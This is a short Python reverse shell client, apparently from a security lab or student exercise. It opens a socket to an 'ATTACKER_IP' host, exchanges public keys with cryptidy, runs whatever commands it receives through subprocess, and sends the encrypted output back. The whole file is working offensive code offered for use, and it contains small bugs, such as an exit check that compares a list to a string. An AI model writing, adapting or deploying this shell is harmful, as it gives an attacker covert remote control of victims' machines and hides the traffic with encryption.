# pylint: disable=bare-except, missing-docstring, import-error
import socket
import subprocess
import os
from cryptidy import asymmetric_encryption as ae

EOF = b'dhruv.anish.samarth.blah.blah'

ATTACKER_IP = '10.0.2.4' # Change this if your attacker machine's IP is different
PORT = 12345  # Change this if you want a different port
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((ATTACKER_IP, PORT))

priv_key, pub_key = ae.generate_keys(2048)
# send over our public key
s.send(pub_key.encode())

# receive the attacker's public key
attacker_pub_key = s.recv(1024).decode()

try:
    while True:
        encrypted_command = s.recv(1024)
        _, attacker_input = ae.decrypt_message(encrypted_command, priv_key)
        attacker_input = attacker_input.split(' ')
        if attacker_input == 'exit':
            s.close()
            break

        if len(attacker_input) == 0:
            s.send(b' ')
            continue
    
        if attacker_input[0] == 'cd':
            if len(attacker_input) != 2:
                s.send('Please only use cd by itself with one argument. ex: "cd _____"')
            else:
                os.chdir(attacker_input[1])
                s.send(b'\n')
        else:
            result = subprocess.run(attacker_input, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, check=False)
            result = result.stdout.decode()
            encrypted_output = ae.encrypt_message(result, attacker_pub_key)
            s.send(encrypted_output + EOF)
except:
    s.close()
